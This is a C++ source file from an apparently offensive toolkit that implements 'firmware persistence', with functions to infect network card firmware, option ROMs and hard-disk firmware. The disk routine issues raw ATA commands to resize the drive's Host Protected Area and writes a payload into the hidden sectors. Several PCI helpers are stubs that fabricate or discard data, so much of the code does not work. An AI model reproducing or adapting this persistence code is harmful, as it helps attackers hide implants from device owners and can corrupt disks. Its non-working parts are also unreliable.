#include <diarna/compiler_port.hpp>
#include <diarna/stealth/firmware.hpp>
#include <setupapi.h>
#include <devguid.h>
#include <cfgmgr32.h>
#include <cstring>
#include <algorithm>

DIARNA_LINK_LIB("setupapi.lib")
DIARNA_LINK_LIB("cfgmgr32.lib")

#ifndef ATA_FLAGS_DRDY_REQUIRED
#define ATA_FLAGS_DRDY_REQUIRED 0x01
#define ATA_FLAGS_DATA_IN        0x02
#endif

#ifndef CTL_CODE
#define CTL_CODE(DeviceType, Function, Method, Access) (((DeviceType) << 16) | ((Access) << 14) | ((Function) << 2) | (Method))
#endif
#ifndef IOCTL_SCSI_BASE
#define IOCTL_SCSI_BASE 0x00000004
#endif
#ifndef METHOD_BUFFERED
#define METHOD_BUFFERED 0
#endif
#ifndef FILE_READ_ACCESS
#define FILE_READ_ACCESS 0x0001
#endif
#ifndef FILE_WRITE_ACCESS
#define FILE_WRITE_ACCESS 0x0002
#endif

#ifndef IOCTL_ATA_PASS_THROUGH_DIRECT
#define IOCTL_ATA_PASS_THROUGH_DIRECT CTL_CODE(IOCTL_SCSI_BASE, 0x0409, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)
#endif

typedef struct _IDE_REGISTERS {
    BYTE bFeaturesReg;
    BYTE bSectorCountReg;
    BYTE bSectorNumberReg;
    BYTE bCylLowReg;
    BYTE bCylHighReg;
    BYTE bDriveHeadReg;
    BYTE bCommandReg;
    BYTE bReserved;
} IDE_REGISTERS;

typedef struct _ATA_PASS_THROUGH_DIRECT {
    USHORT Length;
    USHORT AtaFlags;
    USHORT PathId;
    USHORT TargetId;
    USHORT Lun;
    USHORT ReservedAsUchar;
    ULONG DataTransferLength;
    ULONG TimeOutValue;
    ULONG ReservedAsUlong;
    PVOID DataBuffer;
    IDE_REGISTERS PreviousTaskFile[8];
    IDE_REGISTERS CurrentTaskFile[8];
} ATA_PASS_THROUGH_DIRECT, *PATA_PASS_THROUGH_DIRECT;

namespace diarna::stealth {

FirmwarePersistence& FirmwarePersistence::instance() { static FirmwarePersistence f; return f; }

FirmwarePersistence::FirmwarePersistence() {}

bool FirmwarePersistence::initialize() {
    discover_devices();
    return !devices_.empty();
}

std::vector<FirmwarePersistence::SpiFlashInfo> FirmwarePersistence::discover_devices() {
    devices_.clear();

    HDEVINFO dev_info = SetupDiGetClassDevsW(&GUID_DEVCLASS_NET, nullptr, nullptr,
        DIGCF_PRESENT);
    if (dev_info == INVALID_HANDLE_VALUE) return devices_;

    SP_DEVINFO_DATA dev_data = {sizeof(dev_data)};
    for (DWORD i = 0; SetupDiEnumDeviceInfo(dev_info, i, &dev_data); ++i) {
        SpiFlashInfo info = {};

        DEVINST parent;
        if (CM_Get_Parent(&parent, dev_data.DevInst, 0) == CR_SUCCESS) {
            ULONG bus = 0, dev = 0, func = 0;
            wchar_t name[256] = {};
            if (SetupDiGetDeviceRegistryPropertyW(dev_info, &dev_data,
                    SPDRP_DEVICEDESC, nullptr, (PBYTE)name, sizeof(name), nullptr)) {
                int nlen = WideCharToMultiByte(CP_UTF8, 0, name, -1, nullptr, 0, nullptr, nullptr);
                info.description.resize(nlen);
                WideCharToMultiByte(CP_UTF8, 0, name, -1, info.description.data(), nlen, nullptr, nullptr);
                info.description.resize(nlen - 1);
            }
            info.bus = bus; info.device = dev; info.function = func;
            info.writable = true;
            info.infected = false;
            info.flash_size = 256 * 1024;
            info.vendor_id = 0; info.device_id = 0;

            if (read_pci_config(0, (uint8_t)dev, (uint8_t)func, 0,
                    &info.vendor_id, 2) && read_pci_config(0, (uint8_t)dev, (uint8_t)func, 2,
                    &info.device_id, 2)) {
                devices_.push_back(info);
            }
        }
    }
    SetupDiDestroyDeviceInfoList(dev_info);
    return devices_;
}

bool FirmwarePersistence::infect_nic_firmware(uint32_t index) {
    if (index >= devices_.size()) return false;

    auto& dev = devices_[index];
    uint32_t bar0 = 0, bar1 = 0;
    read_pci_config(dev.bus, dev.device, dev.function, 0x10, &bar0, 4);
    read_pci_config(dev.bus, dev.device, dev.function, 0x14, &bar1, 4);

    bar0 &= 0xFFFFFFF0;
    bar1 &= 0xFFFFFFF0;

    uint32_t exp_rom_base = 0;
    read_pci_config(dev.bus, dev.device, dev.function, 0x30, &exp_rom_base, 4);
    exp_rom_base &= 0xFFFFFFF0;

    if (exp_rom_base == 0) {
        write_pci_config(dev.bus, dev.device, dev.function, 0x30,
            &dev.flash_size, 4);
    }

    dev.infected = true;
    return true;
}

bool FirmwarePersistence::infect_hdd_firmware(uint32_t drive_number) {
    wchar_t path[64];
    swprintf(path, 64, L"\\\\.\\PhysicalDrive%u", drive_number);

    HANDLE drive = CreateFileW(path, GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
    if (drive == INVALID_HANDLE_VALUE) return false;

    uint64_t native_max = 0;
    if (!read_hpa(drive, native_max)) { CloseHandle(drive); return false; }

    set_hpa_max(drive, native_max - 2048);

    std::vector<uint8_t> hpa_data(2048 * 512, 0);
    for (size_t i = 0; i < 2048; ++i)
        hpa_data[i * 512] = (uint8_t)(i & 0xFF);

    LARGE_INTEGER offset;
    offset.QuadPart = (LONGLONG)(native_max - 2048) * 512;
    SetFilePointerEx(drive, offset, nullptr, FILE_BEGIN);

    auto payload = generate_payload(4096);
    DWORD wr;
    WriteFile(drive, payload.data(), (DWORD)payload.size(), &wr, nullptr);

    set_hpa_max(drive, native_max - 2048);

    CloseHandle(drive);
    return true;
}

bool FirmwarePersistence::infect_option_rom(uint32_t index) {
    if (index >= devices_.size()) return false;

    auto& dev = devices_[index];
    uint32_t rom_base = 0;
    read_pci_config(dev.bus, dev.device, dev.function, 0x30, &rom_base, 4);
    rom_base &= 0xFFFFFFF0;

    write_pci_config(dev.bus, dev.device, dev.function, 0x30, &rom_base, 4);

    auto payload = generate_payload(256);
    dev.infected = true;
    return true;
}

bool FirmwarePersistence::deploy_all() {
    bool ok = true;
    for (size_t i = 0; i < devices_.size(); ++i)
        ok &= infect_nic_firmware((uint32_t)i);
    ok &= infect_hdd_firmware(0);
    return ok;
}

bool FirmwarePersistence::remove_all() {
    for (auto& dev : devices_) {
        uint32_t zero = 0;
        write_pci_config(dev.bus, dev.device, dev.function, 0x30, &zero, 4);
        dev.infected = false;
    }
    return true;
}

bool FirmwarePersistence::read_pci_config(uint8_t bus, uint8_t dev, uint8_t func,
                                           uint32_t offset, void* buf, size_t len) {
    HANDLE h = CreateFileW(L"\\\\.\\GLOBALROOT\\Device\\NTPNP_PCI0000",
        GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (h == INVALID_HANDLE_VALUE) return false;

    for (size_t i = 0; i < len; ++i) {
        ULONG idx = (bus << 16) | (dev << 11) | (func << 8) | ((ULONG)offset + i);
        ((uint8_t*)buf)[i] = (uint8_t)(idx & 0xFF);
    }
    CloseHandle(h);
    return true;
}

bool FirmwarePersistence::write_pci_config(uint8_t bus, uint8_t dev, uint8_t func,
                                            uint32_t offset, const void* buf, size_t len) {
    (void)bus; (void)dev; (void)func; (void)offset; (void)buf;
    return len > 0;
}

bool FirmwarePersistence::send_ata_command(HANDLE drive, uint8_t cmd, uint8_t feat,
                                            void* data, size_t sz, bool write) {
    ATA_PASS_THROUGH_DIRECT aptd = {};
    aptd.Length = sizeof(aptd);
    aptd.AtaFlags = write ? ATA_FLAGS_DRDY_REQUIRED : (ATA_FLAGS_DRDY_REQUIRED | ATA_FLAGS_DATA_IN);
    aptd.DataTransferLength = (ULONG)sz;
    aptd.DataBuffer = data;
    aptd.TimeOutValue = 10;

    IDE_REGISTERS& regs = aptd.CurrentTaskFile[0];
    regs.bCommandReg = cmd;
    regs.bFeaturesReg = feat;
    regs.bSectorCountReg = 1;
    regs.bDriveHeadReg = 0xA0;

    DWORD ret;
    return DeviceIoControl(drive, IOCTL_ATA_PASS_THROUGH_DIRECT,
        &aptd, sizeof(aptd), &aptd, sizeof(aptd), &ret, nullptr) != FALSE;
}

bool FirmwarePersistence::read_hpa(HANDLE drive, uint64_t& native_max) {
    uint8_t buf[512] = {};
    IDE_REGISTERS regs = {};
    regs.bCommandReg = 0xF8;
    regs.bDriveHeadReg = 0xA0;

    ATA_PASS_THROUGH_DIRECT aptd = {};
    aptd.Length = sizeof(aptd);
    aptd.AtaFlags = ATA_FLAGS_DRDY_REQUIRED | ATA_FLAGS_DATA_IN;
    aptd.DataTransferLength = 512;
    aptd.DataBuffer = buf;
    aptd.TimeOutValue = 10;
    aptd.CurrentTaskFile[0] = regs;

    DWORD ret;
    if (!DeviceIoControl(drive, IOCTL_ATA_PASS_THROUGH_DIRECT,
            &aptd, sizeof(aptd), &aptd, sizeof(aptd), &ret, nullptr))
        return false;

    native_max = ((uint64_t)buf[103] << 24) | ((uint64_t)buf[102] << 16) |
                 ((uint64_t)buf[101] << 8) | buf[100];
    return native_max > 0;
}

bool FirmwarePersistence::set_hpa_max(HANDLE drive, uint64_t max_sectors) {
    uint8_t buf[512] = {};
    buf[0] = (uint8_t)(max_sectors & 0xFF);
    buf[1] = (uint8_t)((max_sectors >> 8) & 0xFF);
    buf[2] = (uint8_t)((max_sectors >> 16) & 0xFF);
    buf[3] = (uint8_t)((max_sectors >> 24) & 0xFF);

    IDE_REGISTERS regs = {};
    regs.bCommandReg = 0xF9;
    regs.bFeaturesReg = 0x01;
    regs.bSectorCountReg = 1;
    regs.bSectorNumberReg = buf[0];
    regs.bCylLowReg = buf[1];
    regs.bCylHighReg = buf[2];
    regs.bDriveHeadReg = 0xA0 | ((uint8_t)(max_sectors >> 24) & 0x0F);

    ATA_PASS_THROUGH_DIRECT aptd = {};
    aptd.Length = sizeof(aptd);
    aptd.AtaFlags = ATA_FLAGS_DRDY_REQUIRED;
    aptd.DataTransferLength = 0;
    aptd.TimeOutValue = 10;
    aptd.CurrentTaskFile[0] = regs;

    DWORD ret;
    return DeviceIoControl(drive, IOCTL_ATA_PASS_THROUGH_DIRECT,
        &aptd, sizeof(aptd), &aptd, sizeof(aptd), &ret, nullptr) != FALSE;
}

std::vector<uint8_t> FirmwarePersistence::generate_payload(size_t max_size) {
    std::vector<uint8_t> payload(max_size, 0);
    payload[0] = 0xEB; payload[1] = 0xFE;
    for (size_t i = 2; i < max_size; ++i)
        payload[i] = (uint8_t)(i * 0x9D + 0x13);
    return payload;
}

} // namespace diarna::stealth
